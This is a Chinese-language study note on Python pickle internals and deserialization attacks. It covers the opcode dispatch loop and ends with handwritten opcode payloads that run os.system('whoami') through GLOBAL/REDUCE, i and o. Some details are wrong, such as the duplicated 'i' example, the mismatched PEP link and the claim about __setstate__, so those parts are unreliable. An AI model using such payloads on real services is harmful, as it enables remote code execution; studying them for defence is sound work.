# Pickle

## 概念

pickle是Python中一个能够序列化和反序列化对象的模块

```
Python对象及其所拥有的层次结构 --(pickling)--> 二进制字节流 --(unpickling)-->Python对象及其所拥有的层次结构
```

python中序列化的模块还有 **`marshal`**，但是marshal主要是为了支持Python中的`.pyc`文件

ps:下面这一小块直接copy的

pickle实际上可以看作一种**独立的语言**，通过对`opcode`的编写可以进行Python代码执行、覆盖变量等操作。

直接编写的`opcode`灵活性比使用pickle序列化生成的代码更高，并且有的代码不能通过pickle序列化得到（pickle解析能力大于pickle生成能力）

> [!CAUTION]
>
> 当然Pickle能执行Python代码，自然会有安全问题
>
> 警告：Pickle模块在接受被错误地构造或者被恶意地构造的数据时不安全。永远不要unpickle来自于不受信任的或者未经验证的来源的数据



## Pickle模块示例

```python
import pickle
 
class Person():
    def __init__(self):
        self.age=18
        self.name="Pickle"
 
p=Person()
opcode=pickle.dumps(p)
print(opcode)
#结果如下
#b'\x80\x04\x957\x00\x00\x00\x00\x00\x00\x00\x8c\x08__main__\x94\x8c\x06Person\x94\x93\x94)\x81\x94}\x94(\x8c\x03age\x94K\x12\x8c\x04name\x94\x8c\x06Pickle\x94ub.'
 
 
P=pickle.loads(opcode)
print('The age is:'+str(P.age),'The name is:'+P.name)
#结果如下
#The age is:18 The name is:Pickle
```

这里创建了一个Person类，其中有两个属性age和name

首先使用 `pickle.dumps()` 函数将一个Person对象序列化成二进制字节流的形式，然后使用 `pickle.loads()` 将一串二进制字节流反序列化成一个Person对象



## 能够序列化的对象

- **None**
- **True  &  False**
- **int   、float   、complex**
- **str   、byte   、bytearray**
- **元素全为可打包对象的tuple   、list   、set 和 dict**

- **函数**（定义在模块顶层的）
  - 使用 **`def`** 定义_（**`lambda`**不行）
  - _**内置函数**

- **类**（定义在模块顶层的）
  - 使用 **`class`** 定义_

- **实例对象**
  - **`__dict__`** 属性和 **`__getstate__()`** 函数的返回值为可序列化对象



## pickle模块常用函数

```python
pickle.dump(obj, file, protocol=None, *, fix_imports=True)
```

**功能：** 将打包好的对象 *obj* 写入文件中

**参数**： <u>obj</u>：想要序列化的obj对象

​             <u>file</u>：文件名称

​            <u>protocol</u>：【pickling的协议版本】如果该项<u>省略</u>，则默认为0；如果为<u>负值</u>或<u>HIGHEST_PROTOCOL</u>，则使用最高的协议版本



```python
pickle.dumps(obj, protocol=None, *, fix_imports=True)
```

**功能**：将 *obj* 打包以后的对象作为`bytes`类型直接返回

**参数**： <u>obj</u>：想要序列化的obj对象

​            <u>protocol</u>：同上



```python
pickle.load(file, *, fix_imports=True, encoding="ASCII", errors="strict")
```

**功能**：从文件中读取二进制字节流，将其反序列化为一个对象并返回

**参数**： <u>file</u>：读取内容的文件名称



```python
pickle.loads(data, *, fix_imports=True, encoding="ASCII", errors="strict")
```

**功能**：从data中读取二进制字节流，将其反序列化为一个对象并返回

**参数**： <u>data</u>：待反序列化的二进制字节数据



## 魔术方法

```python
object.__reduce__()
```

`__reduce__()`是object类中的一个魔术方法，**序列化**阶段<u>优先触发</u>，在**反序列化**的时候<u>自动执行</u>。

该方法可以返回「可调用函数 + 参数」，能直接执行任意代码

因此可以通过重写类的 `object.__reduce__()` 函数，实现反序列化 **RCE** 命令执行（核心利用点）



```python
object.__getstate__()
```

`__getstate__()`是 object 类中的一个魔术方法，在**序列化对象**的时候自动执行，用于<u>自定义需要序列化保存的对象状态</u>。

我们可以通过重写类的`object.__getstate__()`函数，控制序列化时要保留或剔除的实例属性



```python
object.__setstate__()
```

`__setstate__()`是 object 类中的一个魔术方法，仅在**基础属性**恢复完成后触发，在**反序列化**的时候自动执行，类似于 PHP 中的`__wakeup()`。

该方法仅能修改当前对象自身属性，无法调用外部函数、执行系统命令。

我们可以通过重写类的`object.__setstate__()`函数，使之在反序列化恢复对象时按照重写的逻辑完成属性初始化

# Pickle反序列化

## 原理

### PVM

> pickle可看作独立的栈语言，由一串串 **opcode（操作码）**组成，该语言的解析是依靠**Pickle Virtual Machine（PVM）**（Pickle虚拟机）进行的

**1.PVM组成：**

- **指令处理器**：从流中读取 `opcode` 和参数，并对其进行解释处理
  - 重复该动作，直到遇到 `.` 这个结束符后停止
  - 最终留在**<u>栈顶</u>**的<u>值</u>将被作为<u>反序列化对象</u>返回

- **stack**：由 Python 的 **`list`** 实现（栈）
  - 用来<u>临时存储数据、参数以及对象</u>

- **memo**：由 Python 的 **`dict`** 实现（缓存）
  - 为PVM的<u>整个生命周期提供存储</u>

![PVM](/assets/images/web-note/web-note-010.png)

**2.PVM工作流程**

```
1. 从字节流里依次读取 opcode；
2. 每个 opcode 对应一个固定的操作（压栈、出栈、缓存、调用函数等）；
3. 操作的结果都存在一个栈和一个 memo（缓存）里；
4. 直到遇到 . 这个 STOP 指令，就把栈顶的对象返回。
```

### protocol

> **protocol（协议版本）**是 PVM 在执行过程中，用来 <u>解析数据流的“语法规则手册”</u> ，决定了PVM的解析模式

一般来说，协议版本越高，支持的对象类型和优化越多，但读取该 pickle 数据所需的 Python 版本也越新， 截至目前，pickle一共有 **6** 种协议版本（ v0 - v5 ）

- **v0**

最早的协议，也被称为“人类可读”的协议

它主要使用 **ASCII 字符** 表示 pickle 数据，兼容性最好，可以被较早版本的 Python 读取

- **v1**

v1 版协议是较早的二进制协议

相比 v0，它使用**二进制格式**，序列化结果通常更紧凑，效率也更高，同时仍然兼容较早版本的 Python

- **v2**

v2 版协议在 Python 2.3 中引入

它主要改进了对 [**new-style class**](https://docs.python.org/zh-cn/3.7/glossary.html#term-new-style-class) 的序列化机制，使类实例对象的存储更加高效

官方文档也提到，v2 协议的相关改进可参考 [**PEP 307**](https://peps.python.org/pep-3154/)

- **v3**

v3 版协议在 Python 3.0 中加入

它显式支持 **`bytes`** 对象，但无法被 Python 2.x 读取

这个协议曾经是 Python 3.0 到 Python 3.7 的默认协议

- **v4**

v4 版协议在 Python 3.4 中加入

它支持序列化非常大的对象，也支持更多类型的对象，并且对 pickle 数据格式做了一些优化

这个协议曾经是 Python 3.8 到 Python 3.13 的默认协议

- **v5**

v5 版协议在 Python 3.8 中加入

它增加了对 **out-of-band data** 的支持，也优化了 in-band data 的处理速度

简单理解就是：<u>对于一些大块缓冲区数据，pickle 可以不把所有数据都塞进主 pickle 字节流中，而是允许部分数据通过额外的 buffer 传输</u>

官方文档说明，v5 协议从 Python 3.14 开始成为默认协议

- **默认 + 最高**
  - **`pickle.DEFAULT_PROTOCOL`**  # 当前 Python 版本默认使用的协议版本
  - **`pickle.HIGHEST_PROTOCOL`**  # 当前 Python 版本支持的最高协议版本

##  示例解析

```python
import pickle

class Person:
    def __init__(self):
        self.name = "sgx"
        self.age = 19

def main():
    p = Person()              # 实例化原始对象
    opcode = pickle.dumps(p)  # 序列化
    print(opcode)             # 打印出序列化的值
    
    m = pickle.loads(opcode)                  # 反序列化
    print(f'The age of {m.name} is {m.age}')  # 打印属性
    
if __name__ == "__main__":
    main()
```

要理解 pickle反序列化 ，对这段代码来说，就是搞懂 **`pickle.loads()`** 是如何完成的

>
> 在编辑工具中【CTRL + 左键】，会打开相应模块的源码文件，可以在此查看方法的底层实现

找到 **`pickle.loads()`** 的底层实现代码
```python
def _loads(s, /, *, fix_imports=True, encoding="ASCII", errors="strict",
           buffers=None):
    if isinstance(s, str):
        raise TypeError("Can't load pickle from unicode string")
    file = io.BytesIO(s)
    return _Unpickler(file, fix_imports=fix_imports, buffers=buffers,
                      encoding=encoding, errors=errors).load()
```

关于这部分代码，其实主要起到了 `包装转发` 的作用，并不负责反序列化解析，真正的关键部分在于return部分中 **`_Unpickler`** 实例调用的 **`.load()`** 方法

同样的方法，继续查看 `.load()` 方法的底层实现：（会自动跳转到 **`def load(self):`** 开头的一大段代码，去关键部分）

---

```python
        try:
            while True:
                key = read(1)
                if not key:
                    raise EOFError
                assert isinstance(key, bytes_types)
                dispatch[key[0]](self)
        except _Stop as stopinst:
            return stopinst.value
```

> [!CAUTION]
>
> 这一部分也就是Pickle虚拟机（PVM）的主执行循环，所有<u>反序列化重建对象、操作栈 / 存储区的逻辑</u>全部在这里运行 

**代码解析：**

```
循环依次读取二进制字节流中的单个字节（opcode操作码），
用该字节作为下标查找 dispatch 字典，
调用对应的处理函数执行栈、memo相关逻辑，
直到读取到结束标记后返回重建完成的对象。
```

**实操推导：**

要分析的pickle字节流如下：

```
b'\x80\x05\x954\x00\x00\x00\x00\x00\x00\x00\x8c\x08__main__\x94\x8c\x06Person\x94\x93\x94)\x81\x94}\x94(\x8c\x04name\x94\x8c\x03sgx\x94\x8c\x03age\x94K\x13ub.'
```

按照顺序开始搜索

---

-  **`\x80`**

```python
# 源码预先定义常量
PROTO          = b'\x80'  # identify pickle protocol
```

`PROTO` 是字节 `b'\x80'`，`dispatch` 字典只接受<u>整数</u>作为键，不接受字节，因此必须通过下标转为整数：该字节串仅存 1 个字节，下标从 0 起始，因此只能使用`PROTO[0]`将字节转换为对应整形数值`0x80`，搜索**`dispatch[PROTO[0]]`**，得到对应方法 **`load_proto`**

```python
    def load_proto(self):
        proto = self.read(1)[0] # 读取下一字节
        if not 0 <= proto <= HIGHEST_PROTOCOL:
            raise ValueError("unsupported pickle protocol: %d" % proto)
        self.proto = proto     # 设置版本协议
    dispatch[PROTO[0]] = load_proto
```

作用是读取下一个字节 **`\x05`** ,设置版本协议为5，然后继续往后

- **\x95**

```python
FRAME            = b'\x95'  # indicate the beginning of a new frame
```

跟`\x80`一样的思考方式，对应FRAME，则就是**`dispatch[FRAME[0]]`**，搜索得到对应方法 **`load_frame`**

```python
    def load_frame(self):
        frame_size, = unpack('<Q', self.read(8))  # 读取后8个字节
        if frame_size > sys.maxsize:
            raise ValueError("frame size > sys.maxsize: %d" % frame_size)
        self._unframer.load_frame(frame_size)
    dispatch[FRAME[0]] = load_frame
```

作用是往后读取8个字节，也就是 **`\x954\x00\x00\x00\x00\x00\x00\x00`**（\x954的这个4其实是\x34），然后继续往后

- **`\x8c`**

```python
SHORT_BINUNICODE = b'\x8c'  # push short string; UTF-8 length < 256 bytes
```

一样的做法，对应SHORT_BINUNICODE，那就是 **`dispatch[SHORT_BINUNICODE[0]]`**，对应方法 **`load_short_binunicode`**

```python
    def load_short_binunicode(self):
        len = self.read(1)[0]  # 读取下一个字节作为字符串长度
        self.append(str(self.read(len), 'utf-8', 'surrogatepass'))  # 读取对应长度字节并解码为字符串
    dispatch[SHORT_BINUNICODE[0]] = load_short_binunicode  # 将字符压入栈
```

作用是读取下一个字节 **`\x08`**，也就是长度为8，然后再读取8字节内容，解码得到字符串 **`__main__`**，调用 `self.append()`压入栈

此时栈的状态：`stack = ['__main__']`，memo无变化，然后继续往后

- **\x94**

```python
MEMOIZE          = b'\x94'  # store top of the stack in memo
```

**`dispatch[MEMOIZE[0]]`** ，对应方法 **`load_memoize`**

```python
    def load_memoize(self):
        memo = self.memo
        memo[len(memo)] = self.stack[-1]
    dispatch[MEMOIZE[0]] = load_memoize
```

作用是将栈顶的 **`__main__`** 存入memo缓存，键为当前memo的长度，方便后续指令直接引用该对象，避免重复创建

此时栈状态：stack 无变化，memo 新增一条记录

即：`stack = ['__main__'] memo = {    0: '__main__' }`

ps：注意`MEMOIZE` 只保存栈顶元素，不会把栈顶弹出，所以 stack 不变

---

由上面对于 **\x80 ** 、 **\x95** 、 **\x8c** 和 **\x94** 的推导，我们可以发现pickle反序列化的执行逻辑大致为

```
读取一个 opcode
     ↓ 
通过 dispatch[opcode] 找到对应的 load_xxx() 方法
     ↓ 
该方法继续读取后续参数
     ↓ 
根据 opcode 的作用修改 stack / memo
```

也就是说，在分析 pickle 字节流时，并不是把每一个字节都单独拆开看，而是要按照 **opcode 的格式**进行整体解析

所以如果之后的分析也都像上面一样查源码会非常麻烦，为了更加直观的查看每个opcode的含义，可以使用python自带的 **`pickletools`** 模块


##  常用opcode

- **基础opcode**

| opcode 名称       | 字节表示 | 作用                                                         |
| ----------------- | -------- | ------------------------------------------------------------ |
| `MARK`            | `b'('`   | 向 stack 中压入一个特殊标记，用于标记一段数据的开始          |
| `STOP`            | `b'.'`   | pickle 数据结束，返回栈顶对象                                |
| `POP`             | `b'0'`   | 弹出并丢弃 stack 栈顶元素                                    |
| `POP_MARK`        | `b'1'`   | 弹出并丢弃从栈顶到最近一个 `MARK` 之间的所有元素             |
| `DUP`             | `b'2'`   | 复制 stack 栈顶元素                                          |
| `FLOAT`           | `b'F'`   | 压入一个浮点数，参数是十进制字符串                           |
| `INT`             | `b'I'`   | 压入一个整数或布尔值，参数是十进制字符串                     |
| `BININT`          | `b'J'`   | 压入一个 4 字节有符号整数                                    |
| `BININT1`         | `b'K'`   | 压入一个 1 字节无符号整数                                    |
| `LONG`            | `b'L'`   | 压入一个长整数，参数是十进制字符串                           |
| `BININT2`         | `b'M'`   | 压入一个 2 字节无符号整数                                    |
| `NONE`            | `b'N'`   | 压入 `None`                                                  |
| `PERSID`          | `b'P'`   | 压入持久化对象，id 从字符串参数中读取                        |
| `BINPERSID`       | `b'Q'`   | 压入持久化对象，id 从 stack 中读取                           |
| `REDUCE`          | `b'R'`   | 调用 callable，参数元组也从 stack 中取出                     |
| `STRING`          | `b'S'`   | 压入字符串，参数以换行符结束                                 |
| `BINSTRING`       | `b'T'`   | 压入字符串，参数是带长度的二进制字符串                       |
| `SHORT_BINSTRING` | `b'U'`   | 压入长度小于 256 的短二进制字符串                            |
| `UNICODE`         | `b'V'`   | 压入 Unicode 字符串                                          |
| `BINUNICODE`      | `b'X'`   | 压入 UTF-8 编码的 Unicode 字符串，带长度参数                 |
| `APPEND`          | `b'a'`   | 将栈顶元素追加到其下方的 list 中                             |
| `BUILD`           | `b'b'`   | 调用 `__setstate__()` 或更新对象的 `__dict__`                |
| `GLOBAL`          | `b'c'`   | 根据模块名和对象名查找对象                                   |
| `DICT`            | `b'd'`   | 根据 stack 中的数据构造 dict                                 |
| `EMPTY_DICT`      | `b'}'`   | 向 stack 中压入空字典 `{}`                                   |
| `APPENDS`         | `b'e'`   | 将一段 stack 数据批量追加到 list 中                          |
| `GET`             | `b'g'`   | 根据字符串索引从 memo 中取出对象并压入 stack                 |
| `BINGET`          | `b'h'`   | 根据 1 字节索引从 memo 中取出对象并压入 stack                |
| `INST`            | `b'i'`   | 构造并压入类实例                                             |
| `LONG_BINGET`     | `b'j'`   | 根据 4 字节索引从 memo 中取出对象并压入 stack                |
| `LIST`            | `b'l'`   | 根据 stack 中的数据构造 list                                 |
| `EMPTY_LIST`      | `b']'`   | 向 stack 中压入空列表 `[]`                                   |
| `OBJ`             | `b'o'`   | 构造并压入类实例                                             |
| `PUT`             | `b'p'`   | 将栈顶元素保存到 memo 中，索引是字符串参数                   |

##  漏洞利用

### 1. 命令执行

>GLOBAL 找函数 + TUPLE 构造参数 + REDUCE 调用函数 = 命令执行

- **利用点：**

在魔术方法中提到，**`__reduce__()`** 返回「可调用函数 + 参数」，能直接执行任意代码，因此可以通过重写类的 `object.__reduce__()` 函数，实现反序列化 <u>RCE</u> 命令执行。

- **缺点：**

这种方法一次只能执行一个命令，效果比较局限

- **方法：**

可通过 <u>**手写opcode**</u> （手写数据流）的方法来打破命令次数局限——「去掉在opcode中标志着程序结束的 **`.`**  ，将两个字节流拼接起来」  

- **示例讲解：**

---

```python
# 核心代码
os.system("whoami")
```

↓

```python
# 手写opcode代码-payload
opcode = b'''cos
system
(S'whoami'
tRcos
system
(S'whoami'
tR.'''
```

---

不难发现，中间的代码是<u>完全相同</u>的两段，也就是这个payload会执行两次 **`os.system('whoami')`** 

提取出第一段

```python
cos
system
(S'whoami'
tR
```

先列出其中用到的opcode

| opcode 名称 | 字节表示 | 作用                                                         | **格式**          |
| ----------- | -------- | ------------------------------------------------------------ | ----------------- |
| `GLOBAL`    | `b'c'`   | 根据模块名和对象名查找对象                                   | c模块名<br>对象名 |
| `MARK`      | `b'('`   | 向 stack 中压入一个特殊标记，用于标记一段数据的开始          |                   |
| `STRING`    | `b'S'`   | 压入字符串，参数以换行符结束                                 |                   |
| `TUPLE`     | `b't'`   | 根据 stack 中的数据构造 tuple，把最近一个MARK后面的内容打包成元组 |                   |
| `REDUCE`    | `b'R'`   | 取出 callable 和参数元组，然后执行 callable(*args)           |                   |

1. **`c`：GLOBAL**

```
cos   
system          
  |
  └─——-———(等价于)————->   os.system 
```

2. **`(`：MARK**

```
执行后----> stack = [os.system, MARK]    //英文, + (空格)
```

3. **`S:'whoami'`：STRING**

```
执行后----> stack = [os.system, MARK, 'whoami']
```

4. **`t`：TUPLE**

```
'whoami' --(被t打包后)--> ('whoami',)
                             ↓
     stack = [os.system,('whoami',)]
```

5. **`R`：REDUCE**

```
执行前stack中有：
callable = os.system
args = ('whoami',)
↓
os.system('whoami')
```

​      执行后，`os.system()` 的返回值会被压回 stack，加入说返回值是0，则 `stack = [0]`

再看第二段，与前面的流程完全一样，这次执行完之后，stack大概是`stack = [0,0]`

1. 第一个 `0` 是第一次 `os.system()` 的返回值
2. 第二个 `0` 是第二次的返回值

最后的 **`.` ，STOP**，表示pickle数据结束，`STOP`会把当前<u>栈顶元素</u>作为 `pickle.loads()` 的返回值，所以最后返回的是第二次 **`os.system('whoami')`** 的返回值

所以再次回顾：

```
c os system     -> 找到 os.system 函数
(               -> 标记参数开始
S 'whoami'      -> 压入字符串参数
t               -> 构造参数元组 ('whoami',)
R               -> 执行 os.system('whoami')

c os system     -> 再次找到 os.system 函数
(               -> 标记参数开始
S 'whoami'      -> 压入字符串参数
t               -> 构造参数元组 ('whoami',)
R               -> 再次执行 os.system('whoami')

.               -> 结束，返回栈顶结果
```



- **与函数执行相关的字节码**

1. **R**

```python
opcode1=b'''cos
system
(S'whoami'
tR.'''
```

2. **i**

相当于c和o的组合，先获取一个全局函数，然后寻找栈中的上一个MARK，并组合之间的数据为元组，以该元组为参数执行全局函数（或实例化一个对象）

```python
opcode3=b'''(cos
system
S'whoami'
o.'''
```

3. **o**

寻找栈中的上一个MARK，以之间的第一个数据（必须为函数）为callable，第二个到第n个数据为参数，执行该函数（或实例化一个对象）

```python
opcode3=b'''(cos
system
S'whoami'
o.'''
```

> [!NOTE]
>
> 部分Linux系统下和Windows下的opcode字节流并不兼容，比如<u>Windows</u>下执行系统命令函数为**`os.system()`**，在<u>部分Linux</u>下则为**`posix.system()`**
